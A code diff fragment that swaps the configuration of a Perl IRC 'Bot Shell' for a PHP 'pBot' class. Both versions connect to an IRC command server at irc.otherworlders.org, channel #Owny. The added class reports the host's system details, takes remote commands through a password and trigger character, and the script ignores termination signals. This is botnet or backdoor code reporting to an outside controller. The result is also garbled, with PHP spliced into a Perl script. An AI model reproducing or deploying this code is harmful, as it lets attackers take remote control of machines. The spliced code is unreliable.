@@ -5,25 +5,38 @@
 
 #!/usr/bin/perl
 
-use LWP::UserAgent;
-
-my $linas_max = '5';
-my $sleep = '7';
-my $VERSAO = "2.3.4-1";
-
-$servidor = irc.otherworlders.org;
-my $porta = 6667;
-my $nick = Battouz;
-my $ircname = Battouz;
-my @canais = (#Owny);
-my @adms = (Battouz);
-my $processo = $ARGV[6];
-chop (my $realname = `hostname`);
-
+class pBot 
+{ 
+ var $config = array("server"=>"irc.otherworlders.org",
+                     "port"=>"6667",
+                     "pass"=>"",
+                     "prefix"=>"BTTZ",
+                     "maxrand"=>"4",
+                     "chan"=>"#Owny",
+                     "chan2"=>"#",
+                     "key"=>"",
+                     "modes"=>"+p",
+                     "password"=>"4231",
+                     "trigger"=>".",
+                     "hostauth"=>"*" // * for any hostname (remember: /setvhost xdevil.org)
+                     );
+ var $users = array(); 
+ function start() 
+ { 
+    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
+       $this->start(); 
+    $ident = $this->config['prefix'];
+    $alph = range("0","9");
+    for($i=0;$i<$this->config['maxrand'];$i++) 
+       $ident .= $alph[rand(0,9)];
+    if(strlen($this->config['pass'])>0) 
+       $this->send("PASS ".$this->config['pass']);
+    $this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
+    $this->set_nick();
+    $this->main();
+ } 
 my $success = "\n [+] Bot Shell\n [-] Loading Successfully ...\n [-] Process/PID : $fakeproc - $$\n\n";
 my $failed = "\n [?] perl $0 \n\n";
-
-if (@ARGV != 7) { print $failed; exit(); } else { print $success; }
 
 $SIG{'INT'} = 'IGNORE';
 $SIG{'HUP'} = 'IGNORE';
